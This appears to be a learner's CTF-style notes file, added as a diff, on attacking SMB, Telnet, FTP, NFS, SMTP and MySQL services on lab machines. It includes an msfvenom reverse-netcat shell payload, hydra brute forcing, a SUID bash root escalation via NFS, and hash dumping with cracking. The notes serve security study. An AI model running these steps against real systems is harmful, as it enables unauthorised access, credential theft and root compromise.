@@ -1,0 +1,263 @@
+==> SMB Enumeration
+
+export IP=10.10.168.230 
+
+--> Nmap scan
+nmap $IP -v -oN nmap.log -A -sV -Pn
+
+-> find open ports -> find any smb services that are exposed and are vulnerable
+
+--> Enumeration tool
+enum4linux -v -a $IP
+
+-> find users, shares and that are open
+
+--> Try anonymous login of smb client
+smbclient //$IP/<shareName> -U anonymous
+
+-> if logged in then check the data that is userful
+
+-> from the given information, ssh login is necessary hence download the private ssh auth key from .ssh folder in the share
+
+-> change permissions to that file to "600"
+
+--> ssh login
+ssh <userName>@$IP -i <privateSSHKey>
+
+
+---> find the flag
+
+
+==> Telnet Enumeration
+login command: telnet <ip> <port>
+
+--> Perform nmap scan again
+nmap $IP -v -oN nmap.log2 -p- #scan all the ports
+
+
+-> executing the system commands in the telnet session will not result in any output in the terminal -> need to test whether the commands are being executed or not and for this follow the steps mentioned in the room
+
+-> first run a tcp dump > sudo tcpdump ip proto \\icmp -i tun0
+
+-> then run the ping command to your local system IP from the telnet session
+
+-> If you can see the outputs in the tcpdump session then the commands are actually being executed in the telnet server.
+
+-> Now generate a reverse shell payload using msfvenom framework
+-> msfvenom -p cmd/unix/reverse_netcat lhost=<localIP> lport=4444 R
+
+-> open netcat session in local system and run the payload in the telnet session -> reverse shell is executed and local system is connected to remote machine
+
+
+
+==> FTP Enumeration
+-> do nmap scan
+nmap $IP -v -oN nmap.log3 -A
+
+-> login via ftp -> ftp $IP
+
+-> with the possible username that is found from the ftp session, do brute force attack via ssh protocol using hydra framework
+
+hydra -t 4 -l <userName> -P /usr/share/wordlists/rockyou.txt -vV $IP ftp
+
+-> get the password from hydra -> login using this creads via ftp -> get the flag
+
+
+
+==> NFS Enumeration
+-> use the tool "nfs-common" for more advanced enumerations on NFS programs
+
+NFS-Common
+
+It is important to have this package installed on any machine that uses NFS, either as client or server. It includes programs such as: lockd, statd, showmount, nfsstat, gssd, idmapd and mount.nfs. Primarily, we are concerned with "showmount" and "mount.nfs" as these are going to be most useful to us when it comes to extracting information from the NFS share. If you'd like more information about this package, feel free to read: https://packages.ubuntu.com/jammy/nfs-common.
+
+
+-> do port scanning with nmap
+nmap $IP -v -oN nmap.log4 -A -p-
+
+
+
+-> get the port that is opened for NFS mounting
+
+-> use "showmount" command to display the mounts in the nfs mounts
+> showmount -e $IP
+
+-> mount the volume to local file system
+sudo mount -t nfs $IP:<volume> <localVolumePath> -nolock
+
+-> guess the username and the password for ssh login
+
+-> download the bash from the nfs to local using scp command
+
+-> change the permissions of this bash tool to run as SUID
+sudo chmod +s <filePath>
+
+-> copy this file into the users location via locally mounted file system 
+
+-> ssh into server via the user creds found in above methods
+
+-> run this bash file -> "./bash -p" =>privileges elevated to root
+
+
+==> SMTP Enumeration
+
+-> nmap scan = nmap $IP -v -oN nmap.log5
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-13 12:33 EEST
+Initiating Ping Scan at 12:33
+Scanning 10.10.39.141 [4 ports]
+Completed Ping Scan at 12:33, 0.25s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 12:33
+Completed Parallel DNS resolution of 1 host. at 12:33, 0.00s elapsed
+Initiating SYN Stealth Scan at 12:33
+Scanning 10.10.39.141 [1000 ports]
+Discovered open port 22/tcp on 10.10.39.141
+Discovered open port 25/tcp on 10.10.39.141
+Completed SYN Stealth Scan at 12:33, 3.65s elapsed (1000 total ports)
+Nmap scan report for 10.10.39.141
+Host is up (0.22s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+25/tcp open  smtp
+
+Read data files from: /usr/share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 4.02 seconds
+           Raw packets sent: 1152 (50.664KB) | Rcvd: 1092 (43.676KB)
+
+
+=> msfconsole
+
+-> run the command > search smtp_version => use auxiliary/scanner/smtp/smtp_version 
+
+-> set required options
+
+msf6 auxiliary(scanner/smtp/smtp_version) > options
+
+Module options (auxiliary/scanner/smtp/smtp_version):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS   10.10.39.141     yes       The target host(s), see https://docs
+                                       .metasploit.com/docs/using-metasploi
+                                       t/basics/using-metasploit.html
+   RPORT    25               yes       The target port (TCP)
+   THREADS  1                yes       The number of concurrent threads (ma
+                                       x one per host)
+
+
+-> run the exploit (enter the command "exploit")
+
+-> search smtp_enum exploit and set required options
+
+msf6 auxiliary(scanner/smtp/smtp_enum) > options
+
+Module options (auxiliary/scanner/smtp/smtp_enum):
+
+   Name       Current Setting      Required  Description
+   ----       ---------------      --------  -----------
+   RHOSTS     10.10.39.141         yes       The target host(s), see https:
+                                             //docs.metasploit.com/docs/usi
+                                             ng-metasploit/basics/using-met
+                                             asploit.html
+   RPORT      25                   yes       The target port (TCP)
+   THREADS    1                    yes       The number of concurrent threa
+                                             ds (max one per host)
+   UNIXONLY   true                 yes       Skip Microsoft bannered server
+                                             s when testing unix users
+   USER_FILE  /usr/share/seclists  yes       The file that contains a list
+              /Usernames/top-user            of probable users accounts.
+              names-shortlist.txt
+
+
+
+-> run the above exploit
+
+-> this returns -> username -> value = administrator
+-> run hydra to bruteforce the ssh password as we can see ssh port is open on nmap scan
+
+-> ssh into the remote ip and find the flag in the root folder
+
+
+==> MySQL Enumeration
+
+-> connect to mysql remote server(in this case its thm machine is the remote server)
+
+-> run the command "mysql -h $IP -u <username> -p" -> enter password when prompted for it
+-> if any ssl cert errors then add the flag "--skip-ssl" to the above command, this disables the ssl validation while connecting to the remote sql db
+
+-> lets use metasploit to generate payload
+-> "search mysql_sql" -> returns all the payloads related to mysql_sql
+-> set the options (PASSWORD, RHOSTS, USERNAME)
+-> run the exploit this will return the version of the OS that the program is running on
+-> change the SQL query (which is an option in this exploit) to "show databases" -> after running this exploit it will return the databases present in this mysql server
+
+msf6 auxiliary(admin/mysql/mysql_sql) > options
+
+Module options (auxiliary/admin/mysql/mysql_sql):
+
+   Name  Current Setting   Required  Description
+   ----  ---------------   --------  -----------
+   SQL   select version()  yes       The SQL to execute.
+
+
+   Used when connecting via an existing SESSION:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   no        The session to run this module on
+
+
+   Used when making a new connection via RHOSTS:
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PASSWORD  password         no        The password for the specified user
+                                        name
+   RHOSTS    10.10.50.13      no        The target host(s), see https://doc
+                                        s.metasploit.com/docs/using-metaspl
+                                        oit/basics/using-metasploit.html
+   RPORT     3306             no        The target port (TCP)
+   USERNAME  root             no        The username to authenticate as
+
+
+
+-< now search for "mysql_schemadump" and set relevant options
+
+msf6 auxiliary(scanner/mysql/mysql_schemadump) > options
+
+Module options (auxiliary/scanner/mysql/mysql_schemadump):
+
+   Name             Current Setting  Required  Description
+   ----             ---------------  --------  -----------
+   DISPLAY_RESULTS  true             yes       Display the Results to the S
+                                               creen
+
+
+   Used when connecting via an existing SESSION:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   no        The session to run this module on
+
+
+   Used when making a new connection via RHOSTS:
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PASSWORD                   no        The password for the specified user
+                                        name
+   RHOSTS                     no        The target host(s), see https://doc
+                                        s.metasploit.com/docs/using-metaspl
+                                        oit/basics/using-metasploit.html
+   RPORT     3306             no        The target port (TCP)
+   THREADS   1                yes       The number of concurrent threads (m
+                                        ax one per host)
+   USERNAME                   no        The username to authenticate as
+
+
+
+-> this exploit will gather the schema related information and stores in a file locally usually in ".msf4" folder in respective user root directory
+
+-> now search for exploit mysql_hashdump -> from the output get the username and password and store it in a file and use john the ripper to crack the password of the user
+
+-> try to do ssh for the user with the same cracked password check if password reused or not...
